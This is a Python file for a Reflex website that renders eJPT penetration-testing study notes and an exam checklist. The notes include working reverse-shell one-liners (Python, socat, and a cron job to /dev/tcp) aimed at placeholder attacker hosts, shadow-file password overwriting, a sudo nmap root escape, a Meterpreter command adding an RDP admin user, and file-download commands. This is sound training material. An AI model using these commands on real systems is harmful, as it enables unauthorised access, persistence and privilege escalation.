import reflex as rx
from mysite.styles.styles import *

note1 = """
## Upgrading Non-Interactive Shells

We can see which shells are installed on the system by typing:

```bash
cat /etc/shells
```

Based on that, we can see which command to use.

### Python web rev shell

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP ATTACKER",PORT));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

The most basic upgrade is:

```bash
/bin/bash -i
```

If Python is available:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Other languages:

```bash
perl -e 'exec "/bin/bash";'
```

---

### Spawn a TTY shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# or
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Stabilize the shell

1. Press `CTRL+Z` to background the shell  
2. Run:

```bash
stty raw -echo
fg
export TERM=xterm
```

### Using socat (if available)

On the victim:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:<port>
```

On the attacker:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:<port>
```

### Using `script`

```bash
script /dev/null -c bash
```

### Direct interactive bash

```bash
/bin/bash -i
```

---

### TTY stabilization

Steps:
1. Use `script` or `pty.spawn`  
2. Background shell with `CTRL+Z`  
3. Run: `stty raw -echo; fg`  
4. Then: `reset`  
5. Set environment:

```bash
export TERM=xterm
export SHELL=bash
```

6. Fix TTY size using:

```bash
stty rows <x> columns <y>
```

---

## Pivoting

Pivoting is a post-exploitation technique that involves utilizing a compromised host that is connected to multiple networks to gain access to systems within other networks.

### Port forwarding

Redirects traffic from a specific port on a target system to a specific port on our system.

Steps:
1. Exploit first target  
2. Scan for internal networks/interfaces  
3. Add route (Meterpreter):

```bash
run autoroute -s <ip range>
run autoroute -p   # list active routes
```

4. Scan via compromised host:

```bash
use scanner/portscan/tcp
```

5. Forward ports:

```bash
portfwd add -l 1234 -p <port> -r <ip>
```

6. Use `nc` or `nmap` on forwarded port to enumerate services.

---

## Nikto

Nikto is an open-source vulnerability scanner (Perl-based) for web servers. It detects:

- Misconfigurations  
- Default/insecure files  
- Outdated versions  

Basic usage:

```bash
nikto -url http://target
```

---

## sqlmap

SQLMap automates SQL Injection testing against multiple DB types (MySQL, MSSQL, Oracle, etc.).

Usage examples:
- Against a URL  
- With request files  
- With DB connection strings  
"""

intro = """
# eJPT (eLearnSecurity Junior Penetration Tester)

## What is the eJPT?
The **eLearnSecurity Junior Penetration Tester (eJPT)** is an entry-level penetration testing certification designed for those starting in cybersecurity. Unlike multiple-choice exams, the eJPT is fully **practical**—you’ll be dropped into a lab environment and tasked with performing real-world penetration testing steps.  

The exam covers:
- Network scanning & information gathering  
- Exploitation of common services  
- Web application testing basics  
- Post-exploitation and pivoting  
- Simple reporting and documentation  

It’s a solid stepping stone for students, beginners, or anyone wanting to prove their practical skills before moving to more advanced certifications like OSCP.  

---

## Key Things to Keep in Mind
- **Understand the fundamentals**: Don’t just memorize commands—know *why* you’re running them.  
- **Time management**: You get 72 hours for the exam, but planning your approach saves hours of frustration.  
- **Lab practice is crucial**: The exam is based on the INE course labs. Completing and re-doing them until you’re comfortable will make the real exam feel familiar.  
- **Don’t panic**: If you hit a wall, step back, re-scan, and review your notes. Sometimes a missed detail is the key.  
- **Keep good notes**: Document findings, commands, and outputs during practice. This helps during the exam and builds habits for real-world engagements.  

---

## Basic Tips for Success
- **Enumeration is king**: If you can’t find a way in, go back and scan more thoroughly.  
- **Stay organized**: Use folders for loot, screenshots, and notes.  
- **Brush up on networking basics**: Subnetting, routing, and pivoting come up often.  
- **Learn to upgrade shells**: A stable shell will save time when running multiple commands.  
- **Don’t overcomplicate**: The exam is designed to test fundamentals, not obscure exploits.  

"""

netNote = """
# What is Networking?

Networking is the practice of connecting computers and other devices so they can communicate and share data with each other.

### Key Terms
- **IP Address**: A 32-bit number that identifies a device on a network (e.g., `192.168.1.10`)
- **Subnet Mask**: Determines which part of the IP is the network vs host portion (e.g., `255.255.255.0`)
- **CIDR Notation**: Shorthand for subnet mask  
  Example: `/24` = `255.255.255.0`
- **Network Address**: The first address in a subnet (e.g., `192.168.1.0`)
- **Broadcast Address**: The last address in a subnet (e.g., `192.168.1.255`)

---

Formula:  
`Hosts = 2^(32 - CIDR) - 2`

---

### Useful Tools

**Linux tools to identify subnet info:**
- `ipcalc 10.0.0.1/28`

**If `net-tools` is installed:**
```bash
ifconfig
route -n
```
---

## 🔧 Metasploit for Routing Subnets

To add a route in Metasploit for a subnet (Depends on the subnet you want to add):  

```bash
run autoroute -s 192.168.56.0/24
```

"""

privEscLinux = """
## System Information

We can look for information like the Hostname, Distribution release version, kernel version & architecture, CPU information, Disk information & mounted drives and also installed Packages/software.

- `sysinfo` -> show information about the target | meterpreter  
- `hostname` -> show the hostname of the victim.  
- `cat /etc/issue` -> the actual linux distribution.  
- `cat /etc/*release` -> show more information about the distribution.  
- `uname -a` -> kernel version of the system.  
- `env` -> show the environment of the actual user like user, home and path.  
- `lscpu` -> list the information about cpu such as architecture, model, flags and some other information.  
- `free -h` -> display the ram information.  
- `df -h` -> file systems in a human readable form.  
- `lsblk | grep sd` -> display disk that are on the system configurated.  
- `dpkg -l` -> list the packages that are installed on the system.  

---

## Users & Groups

Here we will be listing the information of users, privileges and groups of the system also for other users on the machine.

- `getuid` -> this will give us the id of the user we are actually | meterpreter  
- `groups <user>` -> list the groups in which the user is part of.  
- `cat /etc/passwd` -> this contains the list of users and their respective terminal if they have one assigned  
- `usermod -aG <group> <user>` -> like this we can add a group to a specific user  

---

## Network Information

In this section we are looking for different information as Current IP address and the network adapter we have, internal networks, containers that might be running any service or some services over TCP/UDP protocols and other hosts on the network.

- `ifconfig` -> with this command we can see the interfaces that are in the machine, like ip's and mac addresses. | Meterpreter  
- `netstat` -> this will list the connections that are running in the machine with the port and some information like if there is listening or established | Meterpreter  
- `cat /etc/networks` -> with this we can see the networks on the machine  
- `cat /etc/hostname` -> Enumerate the hostname of the machine  
- `cat /etc/resolv.conf` -> with this we can see the DNS information configurate  

---

## Processes and Cron jobs

It is important to know which processes are running on the machine we are in also the cron jobs that are configurated to see if any of the scripts or jobs are vulnerable to priv escalation.

- `ps` -> we can enumerate the processes that are running on the machine. | Meterpreter  
- `ps aux` -> this will list the processes in the machine giving more information about the processes that are running and who is running them.  
- `top` -> with the top command we can see processes running in real time, in a interactive way  
- `crontab -l` -> with this we can list the cron jobs that are running for the user.  
- `ls -al /etc/cron*` -> this will list the cron jobs that are created and what they are doing in which time.  

---

## Weak Permissions

We can see the command:

- `find / -not -type l -perm -o+w 2>/dev/null` -> this will be list the files which all the users can edit on the system and check which files can have something interesting to us.  

For example if we can edit the shadow file we know that the passwords are encrypted so we can check if we use `ls -la /etc/shadow` and to generate a password we can use `openssl` in format passwd like this:  

- `openssl passwd -1 -salt abc password`  

Then we can edit the shadow file and change the **\*** to the salt we got before and use the password we specify before.  

---

## Persistence

### SSH

Linux is typically deployed as a server operating system and as a result. Linux servers are typically accessed remotely via services/protocols such as SSH.

There is a file called **id_rsa** that is the private key that will allow others to use it and reconnect to the server/machine.  

Using **scp** we can get files as:  

```bash
scp <user>@<ip>:<file> <location>
```

Once we have the key we can give it the permissions **400** for the `id_rsa`.  

Now that we have that we can use the following command:

- `ssh -i id_rsa <user>@<ip>`  

And we won’t need to provide a password for it.  

---

### Cron jobs

We can use cron jobs to execute a command or scripts at a fixed interval to ensure we have persistent access to the target machine.  

We can create a command cron as:  

```bash
echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1'" > cron
```

Then we can use the **crontab** program to add the cron file we just created using:  

```bash
crontab -i cron
```

---

## How to do it

We can start looking for information in the server as we are.

- `/proc/version`  
- `ps`  
- `env`  
- `sudo -l`  
- `id`  
- `/etc/passwd`  
- `history`  
- `ifconfig`  
- `netstat`  
- `find / -type f -perm 0777` : find files with the 777 permissions (files readable, writable, and executable by all users)  
- `find / -perm a=x` : find executable files  
- `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders  
- `find / -perm -u=s -type f 2>/dev/null` : Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.  
- `find / -type f -perm -04000 -ls 2>/dev/null` : will list files that have SUID or SGID bits set.  

A good place to see binaries we can use [GTFOBins](https://gtfobins.github.io/).  

---

### Steps to get a root shell via Nmap (version < 7.90):

If a user has `sudo` rights to run `nmap`, and the version of Nmap is **older than 7.90**, it can be exploited to spawn a root shell using its **interactive mode** and the `!` shell escape.

1. Run Nmap with `sudo`:  
    ```bash
    sudo nmap --interactive
    ```

2. In the Nmap prompt, type:  
    ```nmap
    !/bin/sh
    ```

3. You now have a **root shell** (`#` prompt).  

#### Notes:

- This method works only in **interactive mode**, which was **removed in Nmap 7.90+**.  
- Check the version with:  
    ```bash
    nmap --version
    ```
---

## Tools

- [LinEnum](https://github.com/rebootuser/LinEnum)  
"""

privEscWindows = """
---

## Local Enumeration

Some important information we need for the system could be:
- Hostname
- OS name
- OS build & service pack
- OS architecture
- Installed updates/hotfixes

To perform local enumeration we can use some commands like:
- `getuid` -> get username | Meterpreter  
- `sysinfo` -> this will give us some information about the computer | meterpreter  
- `hostname` -> this give the same as sysinfo but in the cmd  
- `systeminfo` -> display all the information about the computer  
- `wmic qfe get Caption,Description,HotFixID,InstalledOn` -> this give more information about the hotfix updates and when, to search if any vulnerability haven't been patched  

---

## Users & Groups

When we want to find more users or groups we will usually look for Current users & privileges, additional user information, Other Users on the system, Groups and Members of administration group.

On metasploit we can use the `enum_logged_on_users` post exploitation module to perform a enumeration of logged users, and some others.

- `getprivs` -> this will give us the privileges we have in the machine | meterpreter  
- `whoami` -> current user and hostname  
- `whoami /priv` -> privileges we have and description  
- `query user` -> current logon user  
- `net users` -> accounts on the system  
- `net user <user>` -> to see more about the user we specify  
- `net localgroup` -> show locals groups on the system  

---

## Network Information

We can get some network information like the current IP address & network adapter, Internal networks, containers, TCP/UDP services running and their respective ports, other hosts that are on the network, routing table and the windows firewall state.

- `ipconfig` -> current adapters connected to the pc, subnets, DNS suffix and some others.  
- `ipconfig /all` -> this will provide more information about the system, like MAC ADDRESS and DHCP servers if there is any.  
- `route print` -> give us a route table of the IPV4 if there is any routes that we can use  
- `arp -a` -> list all the devices actives on the network, and see if we have any dynamic or static information of the devices.  
- `netstar -ano` -> list the services on the network with ports, state and PID, we can see that there might be any local service running that we couldn't find using nmap and then exploit them probably.  
- `netsh firewall show state` / `netsh advfirewall firewall show` -> here we will see if the firewall is on, or the information of the firewall.  

---

## Processes & Services

When we gain initial access to a target system, it is important to learn more about the system we are in, services, processes and scheduled tasks are currently running.

We will be trying to get information for Running processes and services, and scheduled tasks.

A process is an instance of a running executable (.exe) or program, a service is a process which runs in the background and does not interact with the desktop.

- `ps` -> This will list the processes that are running in the machine, the path and who is running them | Meterpreter  
- `pgrep` -> search a process id of a specific process which we can migrate to it and have a more stable session. | meterpreter  
- `net start` -> this show services that are started and are running in the background.  
- `wmic service list brief` -> list all running services with the name ID and status.  
- `tasklist /SVC` -> this list the process with services running of that process, showing also the PID, we can see if it has any process that we can exploit to escalate privs  
- `schtask /query /fo LIST v` -> show the complete scheduled tasks that are running with a time and we should check in a editor to see any important info, also check for process that are running by a NT AUTHORITY so we can see if we can exploit it.  

If we are administrator we can actually modify some directories and files using `icacls.exe` and remove flags or things about directories and files.  

---

## Transferring files

- `Copy-Item "\\remote-ip\share\file.txt" "C:\path\file.txt"` -> Copies a file from an SMB share to local path using PowerShell.  
- `Invoke-WebRequest -Uri "http://remote-ip/file.txt" -OutFile "C:\path\file.txt"` -> Downloads a file over HTTP using PowerShell.  
- `Invoke-WebRequest -Uri "ftp://remote-ip/file.txt" -OutFile "C:\path\file.txt"` -> Downloads a file over FTP using PowerShell.  
- `scp user@remote-ip:/path/file.txt C:\path\` -> Securely copies a file over SSH from remote server to local using `scp`.  
- `certutil -urlcache -split -f http://remote-ip/file.txt file.txt` -> Downloads a file over HTTP using the built-in `certutil` utility.  
- `bitsadmin /transfer job /download /priority normal http://remote-ip/file.txt C:\path\file.txt` -> Downloads a file via HTTP using `bitsadmin` (deprecated but still available).  

---

## Identifying Escalation Vulnerabilities

This process will differ greatly based on the type of target you gain access to. Privilege escalation on windows can be performed through a plethora of techniques based on the version of windows and the system's unique configuration.

Once we are in the machine we can run the **PrivescCheck** script to see if there is anything that we can exploit to escalate privileges. (or another script like WinPeas)  

---

# Persistence

Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials and other interruptions that could cut off the access. Some techniques are replacing or hijacking legitimate code or adding startup code. MITRE ATT&CK

There are some modules on msfconsole that we can use for persistence and set a time for it to execute it x times on the system, and when we setup a listener we will be able to get a shell or session again on the system.

### RDP

- `run getgui -e -u <user> -p <password>` -> this will create a user using RDP and add it with the password with the group of Administrators.  

To connect we can use **xfreerdp** as:  

```bash
xfreerdp /u:<user> /p:<password> /v:<ip>
```

---

## Tools

If we are running JAWS for example we need to set up some parameters to run it so it won’t run any error like:  

```powershell
powershell.exe -ExecutionPolicy Bypass -File .\<file> -OutputFilename <name>
```

This will let us run the file and save the output to the output file we assign.

- [JAWS](https://github.com/411Hall/JAWS)  
- [PrivescCheck](https://github.com/itm4n/PrivescCheck)  
"""

def ejpt() -> rx.Component:
    return rx.box(
        rx.desktop_only(
            rx.vstack(
                rx.heading("eJPT Introduction", size="6", color_scheme="pink", weight="bold"),
                rx.card(
                    rx.markdown(intro, padding="2em", color_scheme="blue"),
                ),
                align="center",
            )
        )
    )


def section(title: str, items: list[str]):
     return rx.card(
        rx.vstack(
            rx.heading(title, size="4", margin=".5em", align="center", color_scheme="blue"),
            *[rx.checkbox(label, default_checked=False) for label in items],
            spacing="2",
            align="start",
        ),
        width="100%"
    )

def checklist() -> rx.Component:
    return rx.container(
        rx.vstack(
            rx.heading("eJPT Checklist", size="6", color_scheme="pink", weight="bold"),
            rx.heading(
                "This checklist contains the steps and topics you should cover to prepare for the eJPT exam.",
                size="2",
                color_scheme="orange",
                align="center",
            ),
            section("📘 1. Networking & Protocols", [
                "Understand OSI model",
                "TCP vs UDP",
                "Common ports (21, 22, 23, 25, 53, 80, 110, 443, 445)",
                "Subnetting, IP ranges, CIDR",
                "DNS, DHCP, ARP, ICMP basics",
                "NAT vs PAT",
            ]),
            section("🔍 2. Information Gathering", [
                "Use whois, nslookup, dig",
                "Identify domains, IPs, subdomains",
                "Passive vs active recon",
            ]),
            section("🌐 3. Scanning & Enumeration", [
                "nmap scanning techniques (-sS, -sV, -sC, -A, -p-, --script)",
                "Enumerate SMB (enum4linux, smbclient)",
                "Enumerate FTP, HTTP, SNMP, etc.",
                "Web enumeration with dirb, gobuster, nikto",
            ]),
            section("🛠️ 4. Exploitation Basics", [
                "Manual exploitation (misconfigs, default creds)",
                "searchsploit, exploit-db",
                "Basics of msfconsole, msfvenom",
                "Exploit common services (FTP, SMB, HTTP)",
            ]),
            section("🌐 5. Web App Attacks", [
                "SQL Injection (manual & sqlmap)",
                "XSS (reflected/stored)",
                "File upload bypass",
                "LFI/RFI",
                "Use Burp Suite effectively",
            ]),
            section("🧰 6. Tools You Should Know", [
                "nmap",
                "netcat",
                "hydra",
                "msfconsole, msfvenom",
                "Burp Suite",
                "sqlmap",
                "curl, wget",
                "tcpdump, wireshark",
            ]),
            section("🧪 7. Post-Exploitation", [
                "System enumeration (Windows/Linux)",
                "Find stored passwords or creds",
                "Understand simple pivoting",
                "Privilege escalation basics",
            ]),
            section("🖥️ 8. Practice", [
                "Complete all INE labs",
                "TryHackMe: Jr Pen Tester path",
                "HackTheBox: at least 3 easy boxes",
                "VulnHub: Metasploitable2, Mr Robot, etc.",
            ]),
            section("🎯 9. Pre-Exam", [
                "Build and solve your own mini-lab",
                "Review notes & bookmarks",
                "Prepare tool cheat sheets",
                "Understand eJPT exam structure and tips",
            ]),
            spacing="6",
            align="center",
        )
    )

def notes() -> rx.Component:
    return rx.box(
        rx.desktop_only(
            rx.center(
                rx.vstack(
                    rx.vstack(
                        rx.heading("Shell Upgrades, Stabilization & Pivoting", size="6", color_scheme="pink", weight="bold"),
                        rx.heading(
                            "This section contains some of my notes and tips for the eJPT exam.",
                            size="2",
                            color_scheme="orange",
                        ),
                    align="center"
                    ),
                    rx.card(
                        rx.markdown(
                            note1,
                            padding_left="2em",
                        ),
                        padding="2em",
                    ),
                    padding="2em",
                    align="center",
                ),
            )
        ),
    )

def linuxEsc() -> rx.Component:
    return rx.box(
        rx.desktop_only(
            rx.center(
                rx.vstack(
                    rx.vstack(
                        rx.heading("Linux Privilege Escalation", size="6", color_scheme="pink", weight="bold"),
                        rx.heading(
                            "This section contains some of my notes and tips for the eJPT exam.",
                            size="2",
                            color_scheme="orange",
                        ),
                    align="center"
                    ),
                    rx.card(
                        rx.markdown(privEscLinux, padding_left="2em"),
                        padding="2em",
                    ),
                    padding="2em",
                    align="center",
                ),
            )
        ),
    )

def windowsEsc() -> rx.Component:
    return rx.box(
        rx.desktop_only(
            rx.center(
                rx.vstack(
                    rx.vstack(
                        rx.heading("Windows Privilege Escalation", size="6", color_scheme="pink", weight="bold"),
                        rx.heading(
                            "This section contains some of my notes and tips for the eJPT exam.",
                            size="2",
                            color_scheme="orange",
                        ),
                    align="center"
                    ),
                    rx.card(
                        rx.markdown(privEscWindows, padding_left="2em"),
                        padding="2em",
                    ),
                    padding="2em",
                    align="center",
                ),
            )
        ),
    )

def networkNote() -> rx.Component:
    return rx.box(
        rx.desktop_only(
            rx.center(
                rx.vstack(
                    rx.vstack(
                        rx.heading("Networking Basics", size="6", color_scheme="pink", weight="bold"),
                        rx.heading(
                            "This section contains some of my notes and tips for the eJPT exam.",
                            size="2",
                            color_scheme="orange",
                        ),
                    align="center"
                    ),
                    rx.card(
                        rx.markdown(netNote ,padding_left="2em"),
                        padding="2em",
                    ),
                    padding="2em",
                    align="center",
                ),
            )
        )
    )
